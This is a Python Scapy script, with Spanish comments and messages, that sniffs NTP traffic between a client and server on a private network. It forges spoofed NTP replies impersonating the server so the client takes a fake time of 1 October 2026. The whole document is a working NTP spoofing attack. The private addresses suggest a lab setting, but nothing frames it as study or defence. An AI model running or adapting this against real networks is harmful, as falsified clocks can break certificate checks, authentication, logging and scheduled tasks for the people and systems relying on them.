from scapy.all import sniff, send, IP, UDP
import struct
import calendar

CLIENT_IP = "192.168.56.10"
SERVER_IP = "192.168.56.20"

# Hora falsa: 2026-10-01 12:00:00 UTC
FAKE_TIME = calendar.timegm((2026, 10, 1, 12, 0, 0))


def unix_to_ntp(timestamp):
    seconds = int(timestamp)
    fraction = int((timestamp - seconds) * (2**32))
    return (seconds << 32) | fraction


def handle_packet(packet):

    if not packet.haslayer(IP) or not packet.haslayer(UDP):
        return

    ip = packet[IP]
    udp = packet[UDP]

    if ip.src != CLIENT_IP:
        return

    if ip.dst != SERVER_IP:
        return

    if udp.sport != 123 or udp.dport != 123:
        return

    # Obtener directamente el payload UDP
    data = bytes(udp.payload)

    if len(data) < 48:
        return

    # Timestamp transmitido por el cliente
    client_transmit_timestamp = struct.unpack(
        "!Q", data[40:48]
    )[0]

    fake_timestamp = unix_to_ntp(FAKE_TIME)

    li_vn_mode = 0x24
    stratum = 2
    poll = data[2]
    precision = -20
    root_delay = 0
    root_dispersion = 0
    ref_id = b"FAKE"

    response = struct.pack(
        "!BBbbII4sQQQQ",
        li_vn_mode,
        stratum,
        poll,
        precision,
        root_delay,
        root_dispersion,
        ref_id,
        fake_timestamp,
        client_transmit_timestamp,
        fake_timestamp,
        fake_timestamp
    )

    forged_packet = (
        IP(src=SERVER_IP, dst=CLIENT_IP)
        / UDP(sport=123, dport=123)
        / response
    )

    print(
        f"[+] Consulta NTP interceptada: "
        f"{CLIENT_IP} -> {SERVER_IP}"
    )

    print(
        f"[+] Enviando respuesta falsa: "
        f"{SERVER_IP} -> {CLIENT_IP}"
    )

    print(
        "[+] Hora falsa: "
        "2026-10-01 12:00:00 UTC"
    )

    send(
        forged_packet,
        iface="enp0s3",
        verbose=False
    )


print("[*] NTP spoofing activo")
print(f"[*] Cliente: {CLIENT_IP}")
print(f"[*] Servidor suplantado: {SERVER_IP}")
print("[*] Hora falsa: 2026-10-01 12:00:00 UTC")
print("[*] Esperando consultas NTP...\n")

sniff(
    iface="enp0s3",
    filter="udp port 123",
    prn=handle_packet,
    store=False
)
